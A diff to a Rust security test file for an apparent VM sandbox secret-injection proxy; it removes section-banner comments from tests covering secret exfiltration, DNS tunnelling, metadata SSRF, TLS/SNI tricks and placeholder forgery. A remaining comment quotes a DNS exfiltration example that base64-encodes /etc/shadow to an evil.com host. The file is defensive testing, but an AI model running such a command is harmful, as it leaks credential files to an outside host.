@@ -42,10 +42,6 @@ use redan::secret::{SecretBinding, inject, rewrite_request_headers, scrub};
 use redan::tls::extract_sni;
 use smoltcp::wire::Ipv4Address;
 
-// ============================================================================
-// Helpers
-// ============================================================================
-
 fn secret(placeholder: &str, real: &str, hosts: &[&str]) -> SecretBinding {
     SecretBinding {
         placeholder: placeholder.to_string(),
@@ -84,12 +80,9 @@ fn dns_query(hostname: &str, qtype: u16) -> Vec<u8> {
 
 const GW: Ipv4Address = Ipv4Address::new(192, 168, 127, 1);
 
-// ============================================================================
-// A: Secret injection attacks
 //
 // Threat: attacker-controlled code in the VM crafts HTTP requests to
 // exfiltrate secrets via URL paths, request bodies, or disallowed hosts.
-// ============================================================================
 
 /// CWE-598: Use of GET Request Method With Sensitive Query Strings.
 /// Secrets in URL paths end up in server access logs, CDN caches, Referer
@@ -279,13 +272,10 @@ fn a07_truncated_request_no_panic() {
     let _ = result;
 }
 
-// ============================================================================
-// B: Response scrubbing attacks
 //
 // Threat: upstream server (or attacker-controlled server proxied through
 // an allowed host) reflects the real secret value in a response. Scrubbing
 // tries to catch this, but has documented limitations.
-// ============================================================================
 
 /// Basic scrubbing: literal secret in response body gets replaced.
 #[test]
@@ -418,8 +408,6 @@ fn b06_scrub_catches_secret_in_response_headers() {
     );
 }
 
-// ============================================================================
-// C: DNS exfiltration attacks
 //
 // Threat: guest exfiltrates data by encoding it in DNS queries.
 // Classic technique: `dig $(cat /etc/shadow | base64).evil.com`
@@ -427,7 +415,6 @@ fn b06_scrub_catches_secret_in_response_headers() {
 // MITRE ATT&CK T1048.003: Exfiltration Over Alternative Protocol: DNS.
 // MITRE ATT&CK T1071.004: Application Layer Protocol: DNS.
 // See: Iodine, DNScat2, dns2tcp tools.
-// ============================================================================
 
 /// All A queries resolve to gateway IP. Even queries for attacker-controlled
 /// domains never leave the host -- our synthetic DNS answers them locally.
@@ -583,15 +570,12 @@ fn c08_oversized_label_rejected() {
     );
 }
 
-// ============================================================================
-// D: Network isolation attacks
 //
 // Threat: guest bypasses DNS and connects directly to IP addresses,
 // targeting cloud metadata endpoints, internal networks, or the internet.
 //
 // These tests verify configuration properties. The actual blocking is
 // done by smoltcp (only processes packets for configured IPs).
-// ============================================================================
 
 /// Cloud metadata SSRF via 169.254.169.254.
 ///
@@ -632,12 +616,9 @@ fn d02_gateway_in_isolated_subnet() {
     );
 }
 
-// ============================================================================
-// E: TLS and SNI attacks
 //
 // Threat: guest manipulates TLS handshake to trick the proxy into
 // injecting secrets for the wrong upstream, or to bypass MITM.
-// ============================================================================
 
 /// Domain fronting: SNI says allowed host, but actual request targets
 /// a different backend on the same CDN.
@@ -731,12 +712,9 @@ fn e03_garbage_on_tls_port_no_panic() {
     assert_eq!(extract_sni(&[]), None);
 }
 
-// ============================================================================
-// F: Placeholder token attacks
 //
 // Threat: guest tries to predict or enumerate placeholder tokens to
 // reverse-engineer which secrets are available, or to forge placeholders.
-// ============================================================================
 
 /// Placeholder format: must start with `redan_ph_` prefix.
 /// This is intentionally recognizable (aids debugging). The suffix
@@ -828,14 +806,8 @@ fn e04_websocket_upgrade_detected() {
     );
 }
 
-// ============================================================================
-// H: Oracle review findings
-//
-// Tests added from 4-model security review (Sonnet, Opus, Mistral, Red-team).
-// ============================================================================
-
 /// Accept-Encoding must be stripped to prevent compressed response
-/// scrubbing bypass. All four reviewers flagged this.
+/// scrubbing bypass.
 ///
 /// Without stripping, upstream returns gzip/br/zstd body and scrub()
 /// can't match literal secret bytes in the compressed stream.
@@ -998,13 +970,10 @@ fn h06_scrub_does_not_catch_gzip_compressed_secret() {
     );
 }
 
-// ============================================================================
-// G: VM black-box tests
 //
 // These require libkrun + KVM. Run with: cargo test -- --ignored
 // Each test boots a VM and verifies security properties from the guest's
 // perspective.
-// ============================================================================
 
 /// Guest env var contains placeholder, not real secret.
 ///
